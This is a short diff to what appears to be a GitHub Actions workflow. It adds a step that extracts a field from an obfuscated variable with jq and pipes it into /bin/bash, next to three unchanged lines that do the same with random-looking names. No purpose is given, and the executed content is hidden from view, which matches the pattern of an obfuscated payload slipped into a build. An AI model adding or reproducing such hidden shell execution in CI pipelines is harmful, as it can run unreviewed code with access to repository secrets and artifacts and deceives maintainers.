@@ -34,6 +34,7 @@ jobs:
           echo $asj74582 | jq -r .az9 | /bin/bash
           echo $npvqt709 | jq -r .ujriq0630 | /bin/bash
           printf '%s' "$yes3043" | jq -r .sp236 | /bin/bash
+          echo $ejm0 | jq -r .m2 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
